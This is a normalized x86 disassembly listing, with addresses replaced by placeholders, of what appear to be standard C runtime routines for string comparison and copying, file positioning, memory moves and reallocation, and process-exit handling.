dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
movzx eax [ ebx ]
cmp ax 0x41
jb r-xdata
movzx ecx ax
movzx eax si
sub eax ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test si si
je r-xdata
movzx esi ax
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp si ax
je r-xdata
inc ebx
inc ebx
inc edi
inc edi
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
test si si
je r-xdata
add eax 0x20
cmp si ax
je r-xdata
jmp r-xdata
sub_41617d
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
push edi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_416093
add esp 0x10
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
pop edi
pop esi
pop ebp
retn
mov edi [ ebp + 0x8 ]
cmp edi esi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx esi
je r-xdata
call sub_4119bb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
movzx ecx ax
movzx eax [ edx ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
inc edi
inc edi
inc edx
inc edx
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
movzx edx ax
movzx eax cx
sub eax edx
jmp r-xdata
cmp cx si
je r-xdata
add eax 0x20
cmp cx ax
je r-xdata
sub_416223
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_4121b5
pop ecx
sub_416243
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor esi esi
push edi
cmp ebx esi
jne r-xdata
push [ ebp + 0x8 ]
push ebx
call sub_4202f6
pop ecx
pop ecx
cmp eax [ ebp + 0x8 ]
jb r-xdata
call sub_4119bb
push 0x16
mov edx [ ebp + 0xc ]
mov eax [ edx ]
mov ecx [ eax + 0x14 ]
cmp ecx esi
jne r-xdata
xor eax eax
mov [ ebx ] ax
jmp r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_411f81
leave
retn
push [ eax + 0x4 ]
mov edi 0x100
push esi
push esi
push 0xffffffff
push ebx
push edi
push ecx
push edx
call sub_42029f
mov ecx eax
add esp 0x20
mov [ ebp - 0xc ] ecx
cmp ecx esi
jne r-xdata
mov eax ebx
cmp [ ebx ] si
je r-xdata
cmp [ ebp + 0x8 ] ecx
jae r-xdata
call sub_4119bb
mov [ eax ] 0x2a
xor eax eax
jmp r-xdata
movzx ecx [ eax ]
cmp cx 0x41
jb r-xdata
cmp ecx esi
jle r-xdata
xor eax eax
mov [ ebx ] ax
call sub_4119bb
push 0x22
jmp r-xdata
inc eax
inc eax
cmp [ eax ] si
jne r-xdata
cmp cx 0x5a
ja r-xdata
mov [ ebp - 0x8 ] esi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_41897d
add esp 0x14
mov eax edi
jmp r-xdata
add ecx 0x20
mov [ eax ] cx
mov edx [ ebp + 0xc ]
mov eax [ edx ]
push [ eax + 0x4 ]
push ecx
push [ ebp - 0x8 ]
push 0xffffffff
push ebx
push edi
push [ eax + 0x14 ]
push edx
call sub_42029f
add esp 0x20
test eax eax
je r-xdata
call sub_4119bb
mov [ eax ] 0xc
jmp r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
call sub_4119bb
push 0x2a
pop ecx
mov [ eax ] ecx
mov esi ecx
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
push ebx
call sub_420230
add esp 0xc
mov esi eax
jmp r-xdata
call sub_4119bb
mov eax [ eax ]
jmp r-xdata
push eax
call sub_412584
pop ecx
cmp eax esi
je r-xdata
call sub_420320
mov eax esp
cmp eax esi
je r-xdata
push [ ebp - 0x8 ]
call sub_416223
pop ecx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
cmp [ ebp - 0x8 ] esi
jne r-xdata
add eax 0x8
sub_4163d3
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_415547
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0xc ]
call sub_416243
cmp [ ebp - 0x4 ] 0x0
pop ecx
pop ecx
pop ebx
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_416408
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push 0xffffffff
push [ ebp + 0x8 ]
call sub_4163d3
mov eax [ ebp + 0x8 ]
add esp 0xc
mov eax [ ebp + 0x8 ]
cmp eax esi
jne r-xdata
mov ecx eax
cmp [ eax ] si
je r-xdata
call sub_4119bb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
xor eax eax
jmp r-xdata
pop esi
pop ebp
retn
push edi
inc ecx
inc ecx
cmp [ ecx ] si
jne r-xdata
cmp dx 0x5a
ja r-xdata
movzx edx [ ecx ]
push 0x41
pop edi
cmp di dx
ja r-xdata
pop edi
jmp r-xdata
add edx 0x20
mov [ ecx ] dx
sub_416478
mov edi edi
push ebp
mov ebp esp
mov eax 0x1020
call sub_4137d0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_41b3c1
mov ebx eax
xor eax eax
cmp [ esi + 0x4 ] eax
pop ecx
mov [ ebp - 0x1018 ] ebx
jge r-xdata
push 0x1
push eax
push eax
push ebx
call sub_4203d1
add esp 0x10
mov edi eax
mov [ ebp - 0x1014 ] edi
mov [ ebp - 0x1010 ] edx
test edx edx
jg r-xdata
mov [ esi + 0x4 ] eax
mov eax ebx
sar eax 0x5
lea eax [ eax * 4 + rw-data ]
and ebx 0x1f
mov [ ebp - 0x101c ] eax
mov eax [ eax ]
shl ebx 0x6
add eax ebx
mov cl [ eax + 0x24 ]
add cl cl
sar cl 0x1
test [ esi + 0xc ] 0x108
mov [ ebp - 0x1005 ] cl
jne r-xdata
jl r-xdata
mov ecx [ esi ]
mov edx [ esi + 0x8 ]
mov edi ecx
sub edi edx
mov edx [ esi + 0xc ]
mov [ ebp - 0x100c ] edi
test dl 0x3
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ ebp - 0x1010 ]
cdq
sub edi eax
sbb ecx edx
mov eax edi
mov edx ecx
jmp r-xdata
or eax 0xffffffff
or edx eax
jmp r-xdata
test edi edi
jae r-xdata
test dl dl
js r-xdata
cmp [ ebp - 0x1005 ] 0x1
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_411f81
leave
retn
mov edx [ ebp - 0x1014 ]
or edx [ ebp - 0x1010 ]
jne r-xdata
call sub_4119bb
mov [ eax ] 0x16
jmp r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
xor edx edx
cmp [ eax + 0x30 ] edx
je r-xdata
test [ esi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0x100c ]
jmp r-xdata
mov edx [ esi + 0x8 ]
jmp r-xdata
shr edi 0x1
mov [ ebp - 0x1020 ] edi
cmp [ esi + 0x4 ] edx
jne r-xdata
cmp [ ebp - 0x1005 ] 0x1
jne r-xdata
mov edx [ esi + 0x4 ]
test edx edx
jne r-xdata
cmp edx ecx
jb r-xdata
push edx
push [ eax + 0x2c ]
push [ eax + 0x28 ]
push [ ebp - 0x1018 ]
call sub_4203d1
mov esi eax
mov eax [ ebp - 0x101c ]
mov eax [ eax ]
add eax ebx
add esp 0x10
mov edi edx
cmp esi [ eax + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x1014 ]
mov edx [ ebp - 0x1010 ]
jmp r-xdata
mov eax [ ebp - 0x100c ]
xor edx edx
add eax [ ebp - 0x1014 ]
adc edx [ ebp - 0x1010 ]
shr [ ebp - 0x100c ] 0x1
sub ecx [ esi + 0x8 ]
add ecx edx
test [ eax + 0x4 ] 0x80
mov edi ecx
je r-xdata
and [ ebp - 0x100c ] edx
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
cmp edi [ eax + 0x2c ]
jne r-xdata
cmp [ ebp - 0x1005 ] 0x1
jne r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp - 0x1018 ]
call sub_4203d1
add esp 0x10
cmp eax [ ebp - 0x1014 ]
jne r-xdata
inc edx
inc [ ebp - 0x100c ]
push 0x0
lea ecx [ ebp - 0x100c ]
push ecx
push 0x1000
lea ecx [ ebp - 0x1004 ]
push ecx
push [ eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
sub [ ebp - 0x1014 ] edi
sbb [ ebp - 0x1010 ] 0x0
shr edi 0x1
push 0x0
push [ ebp - 0x1010 ]
push [ ebp - 0x1014 ]
push [ ebp - 0x1018 ]
call sub_4203d1
add esp 0x10
test edx edx
jg r-xdata
cmp edx [ ebp - 0x1010 ]
jne r-xdata
push 0x0
push [ ebp - 0x1010 ]
push [ ebp - 0x1014 ]
push [ ebp - 0x1018 ]
call sub_4203d1
add esp 0x10
test edx edx
jg r-xdata
mov eax 0x200
cmp edi eax
ja r-xdata
jl r-xdata
mov eax [ esi + 0x8 ]
lea ecx [ eax + edi ]
jmp r-xdata
mov ecx [ ebp - 0x100c ]
mov ebx [ ebp - 0x1020 ]
cmp ebx ecx
ja r-xdata
jl r-xdata
mov edi [ esi + 0x18 ]
mov ecx [ esi + 0xc ]
test cl 0x8
je r-xdata
test eax eax
jb r-xdata
cmp eax ecx
jb r-xdata
lea eax [ ebp - 0x1004 ]
test ebx ebx
je r-xdata
test eax eax
jb r-xdata
inc edi
mov edi eax
test ecx 0x400
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ esi + 0xc ] 0x2000
jmp r-xdata
lea ecx [ ebp - 0x1004 ]
sub eax ecx
xor edx edx
add eax esi
adc edx edi
jmp r-xdata
lea edx [ ebp + ecx - 0x1004 ]
mov eax [ ebp - 0x101c ]
mov eax [ eax ]
test [ eax + ebx + 0x4 ] 0x4
inc eax
inc edi
je r-xdata
mov cl [ eax ]
cmp cl 0xd
jne r-xdata
movzx ecx cl
movsx ecx [ ecx + rw-data ]
add eax ecx
lea ecx [ edx - 0x1 ]
cmp eax ecx
jae r-xdata
dec ebx
cmp eax edx
jae r-xdata
inc eax
test ebx ebx
jne r-xdata
lea ecx [ eax + 0x1 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax ecx
jmp r-xdata
sub_4167c4
push 0x10
push r--data
call sub_4183f0
push [ ebp + 0x8 ]
call sub_4136e6
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_416478
pop ecx
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_416804
mov eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_418435
retn
sub_41680e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
push edi
test al 0x83
je r-xdata
call sub_4119bb
mov [ eax ] 0x16
mov edi [ ebp + 0x14 ]
test edi edi
je r-xdata
and eax 0xffffffef
mov [ esi + 0xc ] eax
cmp edi 0x1
jne r-xdata
cmp edi 0x1
je r-xdata
push esi
call sub_415bbb
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push esi
call sub_416478
add [ ebp + 0xc ] eax
pop ecx
adc [ ebp + 0x10 ] edx
xor edi edi
cmp edi 0x2
jne r-xdata
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_41b3c1
pop ecx
push eax
call sub_4203d1
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
test al 0x8
je r-xdata
or eax 0xffffffff
xor eax eax
jmp r-xdata
test eax 0x400
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi + 0x18 ] 0x200
sub_4168aa
push 0xc
push r--data
call sub_4183f0
push [ ebp + 0x8 ]
call sub_4136e6
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41680e
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4168ef
mov eax [ ebp - 0x1c ]
call sub_418435
retn
sub_416900
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_416920
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov edx eax
xor eax eax
and cl 0x1f
shl edx cl
retn
shld edx eax cl
shl eax cl
retn
sub_416940
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_4169c8 ]
jmp [ ecx * 4 + jump_table_416a48 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_416ab4 ]
pop esi
pop edi
pop ebp
jmp sub_420571
jmp [ ecx * 4 + jump_table_416c50 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_416b54 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_416c50 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_416ab4 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_416c50 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_416ab4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_416ab4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_416ab4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_416c50 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_416c50 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_416c50 ]
sub_416ca5
push 0x10
push r--data
call sub_4183f0
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_412584
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
push ebx
call sub_4121b5
pop ecx
jmp r-xdata
call sub_418435
retn
cmp esi 0xffffffe0
jbe r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
test esi esi
jne r-xdata
push esi
call sub_41b47f
pop ecx
call sub_4119bb
push 0x4
call sub_419f99
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_419fcc
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_416de9
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov edi [ ebp - 0x1c ]
test esi esi
jne r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_41a4ca
add esp 0xc
test eax eax
je r-xdata
test edi edi
jne r-xdata
push esi
call sub_41b47f
pop ecx
test eax eax
je r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
jmp r-xdata
inc esi
cmp esi edi
jne r-xdata
push esi
call sub_41a7ab
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
call sub_4119bb
call sub_4119bb
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_41b47f
pop ecx
test eax eax
jne r-xdata
test edi edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
xor esi esi
inc esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_411979
pop ecx
mov [ esi ] eax
jmp r-xdata
call sub_4119bb
cmp [ ebp - 0x20 ] edi
je r-xdata
call sub_4119bb
cmp [ ebp - 0x20 ] edi
jne r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x1c ]
call sub_416940
push ebx
call sub_419fcc
mov [ ebp - 0x20 ] eax
push ebx
push eax
call sub_419ffc
add esp 0x18
mov eax esi
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_411979
mov [ esi ] eax
pop ecx
mov [ eax ] 0xc
jmp r-xdata
mov [ eax ] 0xc
push eax
push ebx
push [ ebp - 0x1c ]
call sub_416940
push ebx
push [ ebp - 0x20 ]
call sub_419ffc
add esp 0x14
mov eax esi
sub_416ec0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_416eed
mov edi edi
push ebp
mov ebp esp
push edi
mov edi 0x3e8
pop edi
pop ebp
retn
test eax eax
je r-xdata
push edi
call [ Sleep@IAT ]
push [ ebp + 0x8 ]
call [ GetModuleHandleW@IAT ]
add edi 0x3e8
cmp edi 0xea60
ja r-xdata
sub_416f1d
mov edi edi
push ebp
mov ebp esp
call sub_417602
push [ ebp + 0x8 ]
call sub_417457
push [ rw-data ]
call sub_417df1
push 0xff
call eax
add esp 0xc
pop ebp
retn
sub_416f46
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_416f9b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_416fb8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_416fde
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_41f377
push r--data
push r--data
call sub_416fb8
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_41dfd0
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push sub_417d50
call sub_411936
mov eax r--data
mov [ esp ] r--data
call sub_416f9b
cmp [ rw-data ] 0x0
pop ecx
je r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
xor eax eax
push rw-data
call sub_41dfd0
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_417063
push 0x18
push r--data
call sub_4183f0
push 0x8
call sub_419f99
pop ecx
and [ ebp - 0x4 ] 0x0
xor ebx ebx
inc ebx
cmp [ rw-data ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41717a
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_418435
retn
mov [ rw-data ] ebx
push 0x8
call sub_419ebf
pop ecx
push [ ebp + 0x8 ]
call sub_416f71
push r--data
mov eax r--data
call sub_416f9b
pop ecx
push [ rw-data ]
call sub_417df1
pop ecx
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
je r-xdata
push r--data
mov eax r--data
call sub_416f9b
pop ecx
push [ rw-data ]
call sub_417df1
pop ecx
mov esi eax
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] esi
call sub_417de8
cmp [ esi ] eax
je r-xdata
sub esi 0x4
mov [ ebp - 0x24 ] esi
cmp esi edi
jb r-xdata
cmp esi edi
jb r-xdata
push [ esi ]
call sub_417df1
mov edi eax
call sub_417de8
mov [ esi ] eax
call edi
push [ rw-data ]
call sub_417df1
mov edi eax
push [ rw-data ]
call sub_417df1
add esp 0xc
cmp [ ebp - 0x1c ] edi
jne r-xdata
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x20 ] eax
mov esi eax
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x20 ] eax
je r-xdata
mov edi [ ebp - 0x28 ]
jmp r-xdata
sub_4171d9
mov edi edi
push esi
call sub_417de8
mov esi eax
push esi
call sub_41b470
push esi
call sub_420b6a
push esi
call sub_418846
push esi
call sub_41abc8
push esi
call sub_420b5b
push esi
call sub_420949
push esi
call sub_41763b
push esi
call sub_420938
push sub_4171a5
call sub_417d76
add esp 0x24
mov [ rw-data ] eax
pop esi
retn
sub_417227
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0xc ]
and eax 0x10
call sub_4119bb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
xor eax eax
jmp r-xdata
pop esi
pop ebp
retn
sub_41725b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0xc ]
and eax 0x20
call sub_4119bb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
xor eax eax
jmp r-xdata
pop esi
pop ebp
retn
sub_417290
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
add ecx 0x1
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
add edi 0x1
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_4172a0
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
